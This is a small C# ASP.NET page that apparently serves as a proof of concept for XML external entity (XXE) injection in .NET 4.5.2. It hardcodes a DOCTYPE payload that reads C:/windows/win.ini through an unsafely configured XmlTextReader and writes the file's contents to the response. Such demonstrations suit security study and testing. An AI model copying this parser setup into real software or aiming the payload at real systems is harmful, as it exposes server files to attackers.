using System;
using System.IO;
using System.Web.UI;
using System.Text;
using System.Xml;

namespace ASP452XXEPOC_unsafe
{
    public partial class _Default : Page
    {
        protected void Page_Load(object sender, EventArgs e)
        {
            string xxePayload = "<!DOCTYPE doc [<!ENTITY win SYSTEM 'file:///C:/windows/win.ini'>]>"
                              + "<doc>&win;</doc>";
            string xml = "<?xml version='1.0' ?>" + xxePayload;
            MemoryStream stream = new MemoryStream(Encoding.UTF8.GetBytes(xml));
            StreamReader streamReader = new StreamReader(stream);
            XmlTextReader r = new XmlTextReader(streamReader);
            XmlDocument doc = new XmlDocument();
            doc.Load(r);
            Response.Write(doc.InnerText);
        }
    }
}